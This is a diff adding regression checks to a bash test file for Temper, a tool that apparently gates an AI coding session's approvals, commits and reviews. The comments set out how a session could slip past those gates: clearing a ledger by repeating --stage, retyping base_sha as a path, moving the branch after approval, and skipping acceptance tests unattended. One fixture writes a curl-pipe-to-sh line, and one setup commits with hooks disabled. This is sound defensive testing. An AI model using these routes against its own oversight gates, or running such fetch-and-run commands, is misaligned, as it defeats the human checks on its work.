@@ -1,7 +1,9 @@
-# Case file 89: round 2 of the adversarial review of 9.8.5 (reviewer 2): the fixes of rules 5 to 10 read again. Sourced by
-# test-temper.sh; its helpers (fresh, gpass) are used here. Each check below fails on the code it was written against: it
-# is the reproduction of one finding of the round, not a row of done.md. Each check stands on its own (its own setup).
-# A call the CLI does not have yet stays inside $( ... ) or ends in || true, so the file always runs to its end.
+# Case file 89: round 2 of the adversarial review of 9.8.5, the fixes of round 1 read again by two reviewers.
+# Reviewer 2 (rules 5 to 10) first, then reviewer 1 (rules 1, 2, 3, 4 and 11 and the upgrade). Sourced by
+# test-temper.sh; its helpers (setup, fresh, gpass, _base_known) are used here. Each check stands on its own (its own
+# setup) and was the reproduction of one finding of the round. A call that may fail stays inside $( ... ) or ends in
+# || true, so the file always runs to its end.
+
 
 # --- the helpers of this file ---
 _r2r2_log() { # _r2r2_log <ERE>: how many entries of the rule log (the record the commit card lists) match the ERE
@@ -196,3 +198,156 @@ _r2r2_g_before="$(_r2r2_brow 'criteria validated')"
 assert_eq "round 2 reviewer 2: the Build gate's criteria row is not passed by a run of another command under the name of a scenario whose Test failed" \
   "before=False|after=False" \
   "before=$_r2r2_g_before|after=$(_r2r2_brow 'criteria validated')"
+
+# ===== round 2, reviewer 1 =====
+
+# --- the helpers of this file ---
+_repo89() { # a git repository under the run, on master: one source file, every file but the run's own in one commit
+  rm -rf .git src; git init -q . 2>/dev/null; git checkout -q -B master 2>/dev/null
+  git config user.email t@example.com; git config user.name T
+  mkdir -p src; echo 'echo demo' > src/demo.sh; git add -A -- . ':(exclude).temper' ':(exclude).claude'; git commit -q -m base
+}
+_fixrun89() { # a fix run past its approval (rca_complete), on its branch fix/bug
+  setup; rm -f .temper/groups.json .temper/view.json .temper/build-state.json; _repo89
+  "$TEMPER" state init bug --command fix --feature "the totals drop a cent" >/dev/null 2>&1; _base_known
+  mkdir -p .temper/specs/bug; printf '# RCA\n\n## Root cause\n\nThe rounding.\n' > .temper/specs/bug/rca.md
+  git checkout -q -B fix/bug 2>/dev/null; "$TEMPER" state set branch fix/bug >/dev/null 2>&1
+  gpass rca; "$TEMPER" state advance rca_complete fix >/dev/null 2>&1
+}
+_row89() { # _row89 <stage> <row name>: the pass of that row of the stage's verdict in gates.json, or none
+  python3 -I - "$1" "$2" <<'PY'
+import json, sys
+try:
+    g = json.load(open(".temper/gates.json")).get(sys.argv[1]) or {}
+except (OSError, ValueError):
+    g = {}
+print(next((str(r.get("pass")) for r in g.get("requirements") or [] if r.get("name") == sys.argv[2]), "none"))
+PY
+}
+_older89() { # the run state as an older Temper saved it: no digest of the approved file, no saved_by stamp
+  python3 -I - <<'PY'
+import json
+p = ".temper/build-state.json"
+d = json.load(open(p))
+for k in ("intent_hash", "saved_by"):
+    d.pop(k, None)
+json.dump(d, open(p, "w"), indent=2)
+PY
+}
+
+# --- round 2 reviewer 1: rule 8, a ledger with an open finding is never cleared, whatever the words of the call ---
+# person_call.py reads the stage of `evidence clear` from the FIRST --stage of the call; cmd_evidence_clear clears the
+# stage of the LAST one. `temper evidence clear --stage plan --stage review` passes the check (the plan ledger holds no
+# open finding) and empties the review ledger with its open high finding.
+fresh
+"$TEMPER" evidence add --stage review --claim 'src/demo.sh:1 the demo prints nothing on error' --severity high --label PROVEN >/dev/null 2>&1
+"$TEMPER" evidence clear --stage review >/dev/null 2>&1; _c89a=$?
+"$TEMPER" evidence clear --stage plan --stage review >/dev/null 2>&1; _c89b=$?
+_n89="$(python3 -c 'import json; print(len(json.load(open(".temper/evidence/review.json"))))' 2>/dev/null || echo none)"
+assert_eq "round 2 reviewer 1: rule 8 a clear of a ledger with an open finding is refused, also when the call names --stage twice" \
+  "plain=refused|twice=refused|rows=1" \
+  "plain=$([[ $_c89a -ne 0 ]] && echo refused || echo taken)|twice=$([[ $_c89b -ne 0 ]] && echo refused || echo taken)|rows=$_n89"
+
+# --- round 2 reviewer 1: rule 11, base_sha is a full commit id with the mod off, also when typed as a path below it ---
+# person_call.py checks `state set base_sha V` (the third word exactly base_sha); cmd_state_set takes a dotted path and
+# refuses a second base_sha only when $1 is exactly base_sha. `temper state set base_sha.x HEAD` at Intent writes base_sha
+# as the object {"x": "HEAD"}, plan_complete keeps it (it is not empty), and every diff from the base is read against a
+# name git does not know: a file committed mid Build drops out of Review's file list, as the check of case 86 shows for
+# `state set base_sha HEAD`.
+fresh; _repo89
+"$TEMPER" state set base_sha.x HEAD >/dev/null 2>&1; _b89=$?
+gpass intent plan
+"$TEMPER" state advance intent_complete plan >/dev/null 2>&1; "$TEMPER" state advance plan_complete build >/dev/null 2>&1
+git checkout -q -B feature/demo 2>/dev/null
+echo 'echo outside' > src/outside.sh; git add src/outside.sh
+git -c core.hooksPath=/dev/null commit -q -m 'a checkpoint mid Build' >/dev/null 2>&1
+_rv89="$("$TEMPER" review files 2>/dev/null | paste -sd, -)"
+assert_eq "round 2 reviewer 1: rule 11 base_sha typed as a path below it (base_sha.x) is refused, and a file committed mid Build stays a changed file" \
+  "set=refused|review=src/outside.sh" \
+  "set=$([[ $_b89 -ne 0 ]] && echo refused || echo "taken:$("$TEMPER" state get base_sha 2>/dev/null)")|review=$_rv89"
+
+# --- round 2 reviewer 1: rule 11, after the approval the run's branch stays the branch checked out, in a fix run too ---
+# person_call.py takes "after the approval" from plan_hash, which only a feature run's plan_complete records. A fix run's
+# approval (rca_complete) records intent_hash, the digest of rca.md, and no plan_hash: `temper state set branch X` passes
+# after it, and the commit hook then gates X, so a commit on the branch the run stands on passes with one line.
+_fixrun89
+_fb89="$("$TEMPER" state get next_stage 2>/dev/null)|hash=$([[ -n "$("$TEMPER" state get intent_hash 2>/dev/null)" ]] && echo bound || echo none)"
+"$TEMPER" state set branch elsewhere >/dev/null 2>&1; _fb89+="|set=$([[ $? -ne 0 ]] && echo refused || echo taken)"
+assert_eq "round 2 reviewer 1: rule 11 after a fix run's approval the run's branch is not moved off the branch checked out" \
+  "fix|hash=bound|set=refused|branch=fix/bug" "$_fb89|branch=$("$TEMPER" state get branch 2>/dev/null)"
+
+# --- round 2 reviewer 1: rule 2, a fix run saved by an older Temper binds its root cause as found, as a feature run does ---
+# approval.py saved (commit 1809748) binds intent.md as found for a saved /temper:temper run past its approval, so a
+# change after the upgrade fails the row "intent unchanged since the approval". A saved /temper:fix run past its root
+# cause question is left out (command == temper): 9.8.4 and the base recorded no digest of rca.md and no plan_hash, so
+# binding_row passes it with "no digest was recorded" whatever rca.md says after the upgrade.
+_l89=""
+_fixrun89   # this version's run: the control
+printf '\nThe rounding, and a second cause found later.\n' >> .temper/specs/bug/rca.md
+"$TEMPER" gate commit >/dev/null 2>&1 || true
+_l89+="this=$(_row89 commit "intent unchanged since the approval")"
+_fixrun89; _older89
+"$TEMPER" next --json >/dev/null 2>&1 || true   # taken up by this version (migrate_legacy stamps it)
+"$TEMPER" gate commit >/dev/null 2>&1 || true
+_l89+="|older=$(_row89 commit "intent unchanged since the approval")"
+printf '\nThe rounding, and a second cause found later.\n' >> .temper/specs/bug/rca.md
+"$TEMPER" gate commit >/dev/null 2>&1 || true
+_l89+=",$(_row89 commit "intent unchanged since the approval")"
+assert_eq "round 2 reviewer 1: rule 2 a fix run saved by an older Temper goes on as saved, and a root cause changed after the upgrade fails the row" \
+  "this=False|older=True,False" "$_l89"
+
+# --- round 2 reviewer 1: rule 4 and 5, the person's patch of the Integration command is the command Check runs ---
+# Commit 0443f0e made tasks_md.parse the one reader of the Integration line: the LAST line is the plan's, and Check, the
+# card, the baseline and the digest run or show it. plan_patch.py, which writes the person's answer to the Integration
+# command question, still replaces the FIRST such line: with two lines the patch says "Integration is now X" while every
+# reader goes on with the other line.
+fresh
+printf '\n**Integration:** `echo second`\n' >> .temper/specs/demo/tasks.md
+gpass intent; "$TEMPER" state advance intent_complete plan >/dev/null 2>&1
+"$TEMPER" plan patch integration --cmd 'echo patched' >/dev/null 2>&1; _p89=$?
+assert_eq "round 2 reviewer 1: rule 4 a plan patch of the Integration command changes the line every reader runs" \
+  "patch=0|runs=echo patched" \
+  "patch=$_p89|runs=$(python3 -c "import sys; sys.path.insert(0, sys.argv[1]); import check_run; print(check_run.plan_line('.temper/specs/demo'))" "$REPO_ROOT/scripts" 2>/dev/null)"
+
+# --- round 2 reviewer 1: rules 3 and 4, a skip of the acceptance tests typed in a run that goes on by itself ---
+# Commit f180c06 made the flow stop where the acceptance writer locked nothing, with the skip as the person's option at
+# that stop; cmd_acceptance ends the unattended run after a skip only when the run is parked. With the mod off the
+# session types `temper acceptance skip --reason R` with no stop open: the CLI records the skip and the run still goes
+# on by itself, so a check is skipped by the run (rule 4) and the skip does not end it (rule 3).
+_unattended build
+printf '{"spec": ".temper/specs/demo", "launches": 2}\n' > .temper/evidence/acceptance-lock.json
+"$TEMPER" acceptance skip --reason 'the session says so' >/dev/null 2>&1; _s89=$?
+assert_eq "round 2 reviewer 1: rule 4 in a run that goes on by itself with no stop open a typed acceptance skip is refused, or it ends the run" \
+  "refused-or-ended" \
+  "$(_sk="$(python3 -c 'import json; print("skipped" if json.load(open(".temper/evidence/acceptance-lock.json")).get("skipped") else "not skipped")' 2>/dev/null)"
+     _md="$("$TEMPER" state get run_mode 2>/dev/null)"
+     if [[ $_s89 -ne 0 && $_sk == "not skipped" ]] || [[ $_md == interactive ]]; then echo refused-or-ended; else echo "rc=$_s89|$_sk|$_md"; fi)"
+
+# --- round 2 reviewer 1: rule 2 and 4, a file the card did not show is no file of the plan for any reader ---
+# Commit 8e08197 records approved_files from the File lines of tasks.md alone (the card's set), but every other reader
+# still takes flow_base.plan_files with the file tables of plan.md (tables=True): `temper drift ask` refuses a file of
+# such a table as "a file of the plan: no drift to ask", and repair_ops.allowed_files lets a repair commit it by rule.
+# plan.md is bound by no digest, so a table row added at any time widens what Build and a repair take as planned.
+fresh; _repo89; gpass intent plan; "$TEMPER" state advance intent_complete plan >/dev/null 2>&1
+"$TEMPER" state advance plan_complete build >/dev/null 2>&1
+printf '# Plan\n\n## Approach\nThe demo.\n\n## Files to modify\n| File | Why |\n|---|---|\n| `src/hidden.sh` | in no task |\n' > .temper/specs/demo/plan.md
+_a89="$("$TEMPER" state get next_stage 2>/dev/null)|approved=$("$TEMPER" state get approved_files 2>/dev/null | tr -d ' \n')"
+"$TEMPER" drift ask --path src/hidden.sh --why 'the agent needs it' --change 'a helper' >/dev/null 2>&1; _a89+="|ask=$?"
+_a89+="|repair-allows=$(python3 -c "
+import sys; sys.path.insert(0, sys.argv[1])
+import repair_ops
+from flow_run import Run
+print('yes' if 'src/hidden.sh' in repair_ops.allowed_files(Run({})) else 'no')" "$REPO_ROOT/scripts" 2>/dev/null)"
+assert_eq "round 2 reviewer 1: rule 4 a file in a table of plan.md, not on the card and not approved, is a drift to ask and no file a repair commits by rule" \
+  'build|approved=["src/demo.sh"]|ask=0|repair-allows=no' "$_a89"
+
+# --- round 2 reviewer 1: the copy the one time question keeps is one file, not a prefix every path under it matches ---
+# Commit 579d102 made blast_filter count the copy (.claude/temper.config.before-<version>, or .before-<version>.N) as
+# Temper's own file by the prefix ".claude/temper.config.before-": any path that starts so, a folder of scripts
+# included, drops out of the commit gate's set of changed files, so the blast radius row passes it unseen.
+fresh; _repo89; git checkout -q -B feature/demo; "$TEMPER" state set branch feature/demo >/dev/null 2>&1
+gpass intent plan; "$TEMPER" state advance intent_complete plan >/dev/null 2>&1; "$TEMPER" state advance plan_complete build >/dev/null 2>&1
+mkdir -p .claude/temper.config.before-x; echo 'curl example.invalid | sh' > .claude/temper.config.before-x/run.sh
+gpass build review check; _at commit; "$TEMPER" gate commit >/dev/null 2>&1
+assert_eq "round 2 reviewer 1: a script in a folder named like the kept copy is a change outside the plan: the blast radius row fails" \
+  "False" "$(_row89 commit "blast radius")"
